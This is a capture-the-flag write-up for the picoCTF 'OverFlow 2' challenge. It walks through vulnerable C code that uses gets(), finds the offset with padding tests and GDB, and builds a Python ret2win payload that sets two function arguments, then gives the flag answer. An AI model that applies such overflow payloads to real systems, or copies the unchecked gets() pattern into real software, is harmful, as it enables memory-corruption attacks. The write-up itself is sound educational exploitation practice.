# OverFlow 2 - Points: 250
<b>Description : </b>Now try overwriting arguments. Can you get the flag from this program? You can find it in /problems/overflow-2_1_210f23786438d7f7e527f4901367a74b on the shell server. Source.<br>
<b>Hints : </b>GDB can print the stack after you send arguments
# Solved
Lets check the source
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
We can see, program allowed us to send buffer <b>176</b> size, lets try to dump using
```python
print 'A' * 180
# Success

print 'A' * 184
# Segmentation Fault

print 'A' * 188
# Program received signal SIGILL, Illegal instruction.
```
So we stay at stack <b>188</b>! lets find out where is address of <b>flag</b>
```
(gdb) print flag
$1 = {<text variable, no debug info>} 0x80485e6 <flag>
```
its <b>0x80485e6</b>, okay we note that. Check again at source we currently see there is 2 arguments must we fill it
```python
stack_size = 188
flag_addrs = 0x080485e6
arguments1 = 0xDEADBEEF
arguments2 = 0xC0DED00D
```
Okay im done, now lets make them into 1
```python
# Since the process is 32 bit we using p32
stack_size = 188
flag_addrs = 0x080485e6
arguments1 = 0xDEADBEEF
arguments2 = 0xC0DED00D

stack = 'A' * stack_size
args = p32(arguments1) + p32(arguments2)
payload = stack + str(p32(flag_addrs)) + 'AAAA' + str(args)

print(payload)
```
I need <b>4 Byte</b> to set argument so i place <b>AAAA</b> there. Execute code and execute program! got the flag :D<br>
Flag : <b>picoCTF{arg5_and_r3turn5001d1db0}</b>